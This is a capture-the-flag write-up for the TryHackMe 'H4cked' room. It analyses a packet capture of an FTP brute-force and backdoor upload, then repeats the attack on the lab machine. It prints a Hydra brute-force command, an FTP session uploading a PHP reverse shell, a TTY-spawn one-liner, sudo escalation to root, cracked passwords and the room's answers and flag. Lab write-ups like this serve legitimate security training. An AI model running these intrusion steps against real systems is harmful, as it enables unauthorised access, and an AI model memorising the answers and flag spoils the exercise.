# H4cked

##

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FB9mh4ZNXtjAD7j51Gm6Z%2F4754ca4214993b9701c7668bbca1a86a.png?alt=media&#x26;token=9ecd2399-1ff5-4b16-a9c8-ac6e3eb4d1eb" alt="" width="183"><figcaption><p><a href="https://tryhackme.com/room/h4cked">https://tryhackme.com/room/h4cked</a></p></figcaption></figure></div>

🔗[ H4cked](https://tryhackme.com/room/h4cked)

#### Task 1 - Starting

**Description/Note**: Find out what happened by analysing a .pcap file and hack your way back into the machine

#### Task 2 - Reconnaissance

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

```
mkdir thm/h4cked.thm
cd thm/h4cked.thm
mkdir {nmap,content,exploits,scripts}
```

In the task 2, we don't need to deploy machine, but we need to analyze pcap file to explore activities and answer at questions.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F439DbsptcEH5OmNmNSVZ%2Fimage.png?alt=media&#x26;token=442cf252-c831-4415-b670-872da17e5da7" alt=""><figcaption></figcaption></figure>

Source IP that sent SYN is `192.168.0.147` then, it's Attacker IP, while destination/victim IP is: `192.168.0.115.`

#### 2.1 - The attacker is trying to log into a specific service. What service is this?

Following first message, we can find that attacker brute force FTP port.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FLifGjd07wKfmusYUxTDd%2Fimage.png?alt=media&#x26;token=0c2e4a4a-8a2e-4579-838d-9c6a4da62e41" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
FTP
{% endhint %}

#### 2.2 - There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?

{% hint style="info" %}
Hydra
{% endhint %}

#### 2.3 - The attacker is trying to log on with a specific username. What is the username?

Looking FTP request we can find it:

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FSkkaH3AdWkzh1rZbLNSo%2Fimage.png?alt=media&#x26;token=996ee0ba-582c-4b80-8650-f95b8d599a2f" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
jenny
{% endhint %}

#### 2.4 - What is the user's password?

Following TCP stream we found that correct psw is:

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FI0wZHxPoztZcABq4UAKx%2Fimage.png?alt=media&#x26;token=51d17bbd-636d-4d5e-939c-f02b9eed8dff" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
password123
{% endhint %}

#### 2.5 - What is the current FTP working directory after the attacker logged in?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F7dysYyDW5e6vaE1tmpHM%2Fimage.png?alt=media&#x26;token=45777052-7e78-4939-b24c-be4e836beae4" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/var/www/html
{% endhint %}

#### 2.6 - The attacker uploaded a backdoor. What is the backdoor's filename?<br>

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F79VHMkKju4mCWt6N2KdK%2Fimage.png?alt=media&#x26;token=39c76a40-e0db-4c2c-9985-994f10f207a2" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
shell.php
{% endhint %}

#### 2.7 - The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FFlHxMpbj0sQIjmkaVoxQ%2Fimage.png?alt=media&#x26;token=9e33b69f-2a23-481d-bd83-3de80df38761" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
[http://pentestmonkey.net/tools/php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell)
{% endhint %}

#### 2.8 - Which command did the attacker manually execute after getting a reverse shell?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FGYieyIrnLaAZ7N99CBIP%2Fimage.png?alt=media&#x26;token=2f9bac87-54b5-4638-b7f8-7e7b8452f16c" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
whoami
{% endhint %}

#### 2.9 - What is the computer's hostname?

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FR4v5pKHxLMDdIm2R6LsS%2Fimage.png?alt=media&#x26;token=aa5a7aa7-3725-4ba0-953e-fe3c3acd6bef" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
wir3
{% endhint %}

#### 2.10 - Which command did the attacker execute to spawn a new TTY shell?

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F3fdhQcZKK7AZrj6W4Shn%2Fimage.png?alt=media&#x26;token=ca8e598a-36e3-4475-9f11-74ca0ed5b5c8" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
python3 -c 'import pty; pty.spawn("/bin/bash")'
{% endhint %}

#### 2.11 - Which command was executed to gain a root shell?<br>

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Fs24S3sHOFY5dTIQmqQ5J%2Fimage.png?alt=media&#x26;token=3d0ca97d-8be2-4a6f-a6b2-0062f2920437" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
sudo su
{% endhint %}

#### 2.12 - The attacker downloaded something from GitHub. What is the name of the GitHub project?

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2F1eSy4qLD3IdkvH4wl5DJ%2Fimage.png?alt=media&#x26;token=98034b66-5b5a-4b42-bb01-d983976a13a4" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
Reptile
{% endhint %}

#### 2.13 - The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2Fb1ypPwzEEodQ2Y6L6yiw%2Fimage.png?alt=media&#x26;token=649ff14a-7211-4126-b892-eac098217dda" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
rootkit
{% endhint %}

### Task 3 - Hack your way back into the machine

Deploy the machine.

The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!

🎯 Target IP: `10.10.123.131`

#### 3.1 - Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.<br>

We can use hydra with wordlist to find psw for 'jenny' user:

```bash
hydra -l jenny -P /usr/share/wordlists/metasploit/unix_passwords.txt h4cked.thm -t 4 ftp
```

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FysCAE1dOOsJXuFXyXoOT%2Fimage.png?alt=media&#x26;token=070ef5d2-a13e-4219-b10f-aafcea0c3af5" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
987654321
{% endhint %}

#### 3.2 - Change the necessary values inside the web shell and upload it to the webserver

We can download php web shell on pentester monkey website: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

and custom it with our local IP:

<div align="left"><figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FIJMvPEnqQQA9uA4rGeOx%2Fimage.png?alt=media&#x26;token=c1e3bf42-2793-471e-b671-28305f786d67" alt=""><figcaption></figcaption></figure></div>

After that, we can connect with FTP credentials and put in our custom php reverse shell.

```bash
ftp h4cked.thm
Connected to h4cked.thm.
220 Hello FTP World!
Name (h4cked.thm:kali): jenny
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||51568|)
150 Ok to send data.
100% |************************************************************************************************************|  5493       30.99 MiB/s    00:00 ETA
226 Transfer complete.
5493 bytes sent in 00:00 (38.18 KiB/s)

ftp> chmod 777 php-reverse-shell.php
200 SITE CHMOD command ok.
ftp> ls
229 Entering Extended Passive Mode (|||11129|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Oct 02 22:48 php-reverse-shell.php
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.
ftp> bye
221 Goodbye.
```

#### 3.3 - Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.

Now, we need to listen on the port setted on reverse shell, and access to machine.

<figure><img src="https://677614291-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FrRWtuMw6xkkeDjZfkcWC%2Fuploads%2FLxn6TIkniEZQ9L65HZfQ%2Fimage.png?alt=media&#x26;token=6942a5cc-4641-410d-8426-5d88d0dab1f3" alt=""><figcaption></figcaption></figure>

As you can see, this shell is not stable. So, we can use the traditional Python script to make it more stable.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 
```

#### 3.4 - Become root!

We know that www-data user haven't root privileges. But we also know that Jenny has root privileges on the machine. So, let us change the user to Jenny and become root.<br>

```bash
whoami
www-data
www-data@wir3:/$ su jenny
su jenny
Password: 987654321

jenny@wir3:/$ sudo -l
sudo -l
[sudo] password for jenny: 987654321

Matching Defaults entries for jenny on wir3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
sudo su
root@wir3:/
```

#### 3.5 - Read the flag.txt file inside the Reptile directory

We just say that flag is in path /root/Reptile, then we quickly go them.

```bash
cd /root/Reptile
root@wir3:~/Reptile
ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
root@wir3:~/Reptile
cat flag.txt
```

<details>

<summary>🚩 Root Flag (flag.txt)</summary>

ebcefd66ca4b559d17b440b6e67fd0fd

</details>
